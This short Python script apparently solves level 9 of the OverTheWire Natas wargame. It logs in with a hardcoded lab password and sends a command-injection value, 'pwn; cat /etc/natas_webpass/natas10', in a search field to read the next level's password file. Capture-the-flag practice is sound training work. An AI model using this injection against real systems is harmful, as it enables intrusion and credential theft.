#!/usr/bin/env python

import requests
import re

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = 'http://natas9.natas.labs.overthewire.org'

injection = 'pwn; cat /etc/natas_webpass/natas10'

req = requests.post(url, auth=(username,password), data = {'needle': injection, 'submit': 'submit'})

print(re.findall('<pre>\n(.*)', req.text)[0])


